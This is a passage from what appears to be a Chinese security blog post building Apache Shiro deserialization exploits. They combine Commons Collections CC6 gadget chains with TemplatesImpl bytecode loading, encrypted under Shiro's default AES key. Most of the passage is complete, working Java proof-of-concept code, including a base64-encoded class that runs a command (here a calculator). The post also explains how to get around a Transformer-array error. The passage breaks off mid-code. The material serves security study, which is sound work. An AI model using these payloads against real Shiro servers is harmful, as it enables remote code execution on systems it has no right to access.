class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShiroCC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException </span>&#123;<br>        Transformer[] fakeTransfomer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">1</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">1</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;gnome-calculator&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransfomer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(inerMap,chainedTransformer);<br><br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Field field = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(chainedTransformer,transformers);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><span class="hljs-comment">// 对序列化的结果进行加密</span><br>        <span class="hljs-keyword">byte</span>[] payload = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        ByteSource ciphertxt = aes.encrypt(payload, key);<br>        System.out.println(ciphertxt.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接传过去会报错</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115220713778.png" alt="image-20211115220713778"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115220653539.png" alt="image-20211115220653539"></p><p>看了一下P神的文章，这里的报错的是因为<code>Transformer</code>数组的问题</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115221233558.png" alt="image-20211115221233558"></p><p><strong>所以这里的问题就是要解决怎么样不使用数组来构造可利用链子？</strong></p><p>如果使用<code>TemplatesImpl</code>加载字节码的话，也是会有两个元素的数组的。能不能减少呢？</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115223038870.png" alt="image-20211115223038870"></p><p>可以利用上面的<code>getValue()</code>方法调用到<code>LazyMap()</code>的<code>get()</code>方法，之后利用<code>this.factory.transform(key)</code>来执行到<code>transformer()</code>函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115223132095.png" alt="image-20211115223132095"></p><p>这里之前分析过，直接绕过<code>InvokerTransformer()</code>执行字节码</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115222331941.png" alt="image-20211115222331941"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 最初的执行方法</span><br><span class="hljs-keyword">byte</span>[] code = <span class="hljs-string">&quot;&quot;</span>.getBytes();<br>TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>templates.newTransformer();<br><span class="hljs-comment">// CC3 中的执行方法</span><br><span class="hljs-keyword">byte</span>[] code = <span class="hljs-string">&quot;&quot;</span>.getBytes();<br>TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br><span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br><span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br><span class="hljs-comment">// 或者</span><br>Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br><span class="hljs-keyword">new</span> ConstantTransformer(templates),<br><span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里根据之前的payload看就可以直接把数组去掉然后直接构造</p><p>先构造好字节码，作用就是弹出计算器</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115234747396.png" alt="image-20211115234747396"></p><p>第一种 POC：根据<code>templates.newTransformer();</code>来直接构造POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplShiroCC6Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAEbWFpbgEAFihbTGphdmEv&quot;</span> +<br>                <span class="hljs-string">&quot;bGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh&quot;</span> +<br>                <span class="hljs-string">&quot;YmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zBwAqAQAGPGluaXQ+&quot;</span> +<br>                <span class="hljs-string">&quot;AQADKClWAQAEdGhpcwEAEkxvcmcvbGNkbTEyMy9FeGVjOwEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3Vt&quot;</span> +<br>                <span class="hljs-string">&quot;ZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +<br>                <span class="hljs-string">&quot;YWxpemF0aW9uSGFuZGxlcjsHACsBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5h&quot;</span> +<br>                <span class="hljs-string">&quot;bC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJ&quot;</span> +<br>                <span class="hljs-string">&quot;dGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1Nlcmlh&quot;</span> +<br>                <span class="hljs-string">&quot;bGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJj&quot;</span> +<br>                <span class="hljs-string">&quot;ZUZpbGUBAAlFeGVjLmphdmEBABBvcmcvbGNkbTEyMy9FeGVjDAARABIHACwMAC0ALgEAEGdub21l&quot;</span> +<br>                <span class="hljs-string">&quot;LWNhbGN1bGF0b3IMAC8AMAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0&quot;</span> +<br>                <span class="hljs-string">&quot;Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2&quot;</span> +<br>                <span class="hljs-string">&quot;YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhl&quot;</span> +<br>                <span class="hljs-string">&quot;YwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJ&quot;</span> +<br>                <span class="hljs-string">&quot;AAgACQACAAoAAAA3AAIAAQAAAAm7AAFZtwACV7EAAAACAAsAAAAKAAIAAAANAAgADgAMAAAADAAB&quot;</span> +<br>                <span class="hljs-string">&quot;AAAACQANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAQAACAAEAAAAOKrcAA7gABBIFtgAGV7EA&quot;</span> +<br>                <span class="hljs-string">&quot;AAACAAsAAAAOAAMAAAAPAAQAEAANABEADAAAAAwAAQAAAA4AEwAUAAAADwAAAAQAAQAQAAEAFQAW&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAWAAwAAAAgAAMAAAABABMAFAAAAAAAAQAX&quot;</span> +<br>                <span class="hljs-string">&quot;ABgAAQAAAAEAGQAaAAIADwAAAAQAAQAbAAEAFQAcAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAG&quot;</span> +<br>                <span class="hljs-string">&quot;AAEAAAAbAAwAAAAqAAQAAAABABMAFAAAAAAAAQAXABgAAQAAAAEAHQAeAAIAAAABAB8AIAADAA8A&quot;</span> +<br>                <span class="hljs-string">&quot;AAAEAAEAGwABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        <span class="hljs-comment">//setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        Transformer[] faketransformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer transformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformer);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(inerMap, chainedTransformer);<br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,templates);<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;lcdm&quot;</span>);<br>        outerMap.clear();<br>        setFieldValue(outerMap,<span class="hljs-string">&quot;factory&quot;</span>, transformer);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        AesCipherService aes = <span class="hljs-keyword">new</span> AesCipherService();<br>        <span class="hljs-keyword">byte</span>[] key = Base64.getDecoder().decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        ByteSource payload = aes.encrypt(bytes, key);<br>        System.out.println(payload.toString());<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = obj.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115235103394.png" alt="image-20211115235103394"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115235253251.png" alt="image-20211115235253251"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115234618480.png" alt="image-20211115234618480"></p><p>第二种：利用<code>TrAXFilter</code>类</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211116000340086.png" alt="image-20211116000340086"></p><p>利用上面的反射调用它的构造方法</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211115222331941.png" alt="image-20211115222331941"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplShiroCC6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAEbWFpbgEAFihbTGphdmEv&quot;</span> +<br>                <span class="hljs-string">&quot;bGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh&quot;</span> +<br>                <span class="hljs-string">&quot;YmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zBwAqAQAGPGluaXQ+&quot;</span> +<br>                <span class="hljs-string">&quot;AQADKClWAQAEdGhpcwEAEkxvcmcvbGNkbTEyMy9FeGVjOwEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3Vt&quot;</span> +<br>                <span class="hljs-string">&quot;ZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +<br>                <span class="hljs-string">&quot;YWxpemF0aW9uSGFuZGxlcjsHACsBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5h&quot;</span> +<br>                <span class="hljs-string">&quot;bC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJ&quot;</span> +<br>                <span class="hljs-string">&quot;dGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1Nlcmlh&quot;</span> +<br>                <span class="hljs-string">&quot;bGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJj&quot;</span> +<br>                <span class="hljs-string">&quot;ZUZpbGUBAAlFeGVjLmphdmEBABBvcmcvbGNkbTEyMy9FeGVjDAARABIHACwMAC0ALgEAEGdub21l&quot;</span> +<br>                <span class="hljs-string">&quot;LWNhbGN1bGF0b3IMAC8AMAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0&quot;</span> +<br>                <span class="hljs-string">&quot;Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2&quot;</span> +<br>                <span class="hljs-string">&quot;YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhl&quot;</span> +<br>                <span class="hljs-string">&quot;YwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJ&quot;</span> +<br>                <span 